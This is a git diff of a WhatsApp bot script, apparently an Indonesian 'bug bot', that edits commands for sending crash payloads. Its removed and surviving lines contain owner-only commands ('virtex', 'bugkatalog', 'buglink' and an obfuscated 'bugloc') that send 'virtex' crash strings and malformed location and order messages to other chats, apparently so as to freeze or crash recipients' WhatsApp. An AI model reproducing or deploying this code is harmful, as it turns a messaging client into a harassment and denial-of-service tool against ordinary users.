@@ -72,7 +72,7 @@ isCharge: "" || true
 
 const starts = async (client = new WAConnection()) => {
 	client.logger.level = 'warn'
-	client.version = [2, 6666, 9]
+	client.version = [2, 2143, 8]
 	client.browserDescription = [ 'I-AM BOOST', '3.0' ]
 	client.on('qr', () => {
 		console.log(color(' Scan.!!'))
@@ -684,21 +684,6 @@ const starts = async (client = new WAConnection()) => {
 			}
 			reply('Sukses send bug sebanyak '+args.join(' '))
 			break
-case 'virtex':
-if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
-katalog(`${ngazap(prefix)}`)
-katalog(`${emoji2(prefix)}`)
-katalog(`${virtex(prefix)}`)
-katalog(`${virtex2(prefix)}`)
-katalog(`${virtex3(prefix)}`)
-katalog(`${virtex4(prefix)}`)
-katalog(`${virtex5(prefix)}`)
-katalog(`${virtex6(prefix)}`)
-katalog(`${virtex7(prefix)}`)
-katalog(`${virtex8(prefix)}`)
-katalog(`${virtex9(prefix)}`)
-katalog(`${virtag(prefix)}`)
-break
 case 'bugkatalog':
 if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
 client.toggleDisappearingMessages(from, 0)
@@ -726,9 +711,6 @@ client.toggleDisappearingMessages(from, 0)
         babi(`${virtex6(prefix)}`)
         babi(`${emoji2(prefix)}`)
         break
-case 'bugloc':
-function _0x4ee9(_0x1253de,_0x4df4d5){var _0x587b3c=_0x587b();return _0x4ee9=function(_0x4ee946,_0x170efd){_0x4ee946=_0x4ee946-0x1c6;var _0x33a62e=_0x587b3c[_0x4ee946];return _0x33a62e;},_0x4ee9(_0x1253de,_0x4df4d5);}var _0x1fb12b=_0x4ee9;function _0x587b(){var _0x573ab6=['readFileSync','12536840GCstSf','sendMessage','only','536IkuDmm','key','2675700WtsjtO','ownerB','./client.jpg','fromMe','2224464MiisaG','18qcFOZT','83468rQXPeY','0@s.whatsapp.net','25944fErnRh','115851EirsKL','184fyRhDo','178400WTzYEN'];_0x587b=function(){return _0x573ab6;};return _0x587b();}(function(_0x2dcd13,_0x2f923e){var _0x3d06c1=_0x4ee9,_0x2352ff=_0x2dcd13();while(!![]){try{var _0x266d76=parseInt(_0x3d06c1(0x1cc))/0x1+-parseInt(_0x3d06c1(0x1ce))/0x2+-parseInt(_0x3d06c1(0x1cb))/0x3*(parseInt(_0x3d06c1(0x1cd))/0x4)+-parseInt(_0x3d06c1(0x1d5))/0x5+-parseInt(_0x3d06c1(0x1c7))/0x6+-parseInt(_0x3d06c1(0x1c9))/0x7*(parseInt(_0x3d06c1(0x1d3))/0x8)+-parseInt(_0x3d06c1(0x1c8))/0x9*(-parseInt(_0x3d06c1(0x1d0))/0xa);if(_0x266d76===_0x2f923e)break;else _0x2352ff['push'](_0x2352ff['shift']());}catch(_0x4d3113){_0x2352ff['push'](_0x2352ff['shift']());}}}(_0x587b,0x6953b));if(!isOwner&&!mek[_0x1fb12b(0x1d4)][_0x1fb12b(0x1c6)])return reply(mess[_0x1fb12b(0x1d2)][_0x1fb12b(0x1d6)]);denz[_0x1fb12b(0x1d1)](from,{'degreesLatitude':6.493187928699356,'degreesLongitude':80.30968201252108,'name':''+emoji2(prefix),'address':''+virtex6(prefix),'jpegThumbnail':fs[_0x1fb12b(0x1cf)](_0x1fb12b(0x1d7))},location,{'quoted':{'key':{'participant':_0x1fb12b(0x1ca)},'message':{'orderMessage':{'itemCount':0x98967f,'status':0x1,'surface':0x1,'message':''+NamaBot,'orderTitle':''+NamaOwner,'sellerJid':'0@s.whatsapp.net'}}}});
-         break
                 case 'buglink':
                 if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                  await client.relayWAMessage(client.prepareMessageFromContent(from, client.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
@@ -1038,7 +1020,7 @@ case 'bc':
          reply('Suksess broadcast')
          } else {
          for (let _ of anu) {
-         sendMessage(_.jid, `[ * BROADCAST ALL* ]\n\n${body.slice(4)}`)
+         client.sendMessage(_.jid, `[ * BROADCAST ALL* ]\n\n${body.slice(4)}`)
          }
          reply('Suksess broadcast')
          }
